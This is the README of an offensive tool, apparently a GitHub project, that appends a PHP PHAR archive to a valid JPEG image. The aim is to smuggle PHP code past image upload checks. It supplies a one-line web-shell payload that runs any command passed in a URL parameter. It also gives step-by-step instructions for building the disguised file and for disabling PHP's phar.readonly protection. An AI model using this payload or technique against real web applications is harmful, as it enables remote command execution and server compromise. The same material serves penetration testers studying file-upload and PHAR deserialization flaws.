# JPEG PHAR Fusion

This is a simple tool to add a phar payload at the end of a valid jpeg image.

## Requierments
- Python 3
- Php (Tested with php 8)

## Usage

Clone the repo
git clone https://github.com/Sarapuce/jpeg-phar-fusion.git

Choose a php payload finishing by __HALT_COMPILER(); for example :
<?php system($_GET["cmd"]); __HALT_COMPILER(); ?>

Place the php code int the text file called "malicious_php_code.txt"

Create the payload with the script
python3 phar_creator.py

The file is in malicious.jpg

Run "php include.php" to see the code executed!!

## If It doesn't work 😡
Do you have the error

PHP Fatal error: Uncaught UnexpectedValueException: creating archive "payload.phar" disabled by the php.ini setting phar.readonly

You need to enable the phar creation in php.ini

To locate your php.ini

php --ini

Then edit this line in your file

;phar.readonly = Off

into

phar.readonly = Off

